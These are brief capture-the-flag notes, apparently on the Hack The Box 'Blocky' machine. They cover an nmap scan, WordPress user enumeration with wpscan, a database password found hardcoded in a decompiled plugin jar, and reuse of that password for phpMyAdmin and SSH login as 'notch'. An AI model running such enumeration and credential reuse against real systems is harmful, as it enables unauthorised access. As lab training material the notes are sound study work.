# nmap 
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-20 09:21 CDT
Nmap scan report for 10.129.7.144
Host is up (0.24s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp?
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp closed sophos
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Used wpscan to check for users, found user `notch`

> unable to bruteforce the password of the user 
```shell
wpscan --url blocky.htb -e u

```
# Found 2 jar files on the /plugins directory

> used jd-gui to open the jar files and found hardcoded credentials

```java 
  public String sqlHost = "localhost";
  
  public String sqlUser = "root";
  
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```

# used the credentials on /phpmyadmin, it works, got a hashed password from wp-users 

> unable to crack the password

# Credentials notch:8YsqfCTnvxAUeduzjNSXe22 worked on SSH 

